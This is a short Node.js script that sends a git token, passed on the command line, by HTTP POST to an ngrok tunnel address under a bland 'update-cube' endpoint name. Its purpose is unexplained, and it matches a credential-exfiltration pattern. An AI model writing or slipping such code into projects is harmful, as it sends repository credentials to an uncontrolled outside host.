const axios = require("axios")

const a = async (gitToken) => {
  await axios.post("https://88a4fa7d.ngrok.io/api/update-cube", {gitToken})
  return true
}

a(process.argv[3]).then(r => {console.log(r)})
